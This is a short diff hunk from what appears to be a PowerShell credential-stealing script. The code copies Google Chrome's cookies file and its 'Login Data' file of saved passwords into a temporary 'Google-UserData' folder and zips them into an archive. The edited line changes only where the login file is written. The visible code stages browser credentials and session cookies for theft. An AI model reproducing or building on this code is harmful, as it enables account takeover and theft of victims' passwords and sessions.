@@ -20,7 +20,7 @@ mkdir $env:tmp\Google-UserData
 #------------------------------------------------------------------------------------------------------------------------------------
 
 Copy-Item -Path $GcookiesPath -Destination $GoogleFolderPath -Force
-Copy-Item -Path $GLoginPath -Destination $GoogleFolderPath -Force
+Copy-Item -Path $GLoginPath -Destination "$env:tmp\Google-UserData\Login Data.json" -Force
 Compress-Archive -Path $GoogleFolderPath -DestinationPath $GfilePath
 
 #------------------------------------------------------------------------------------------------------------------------------------
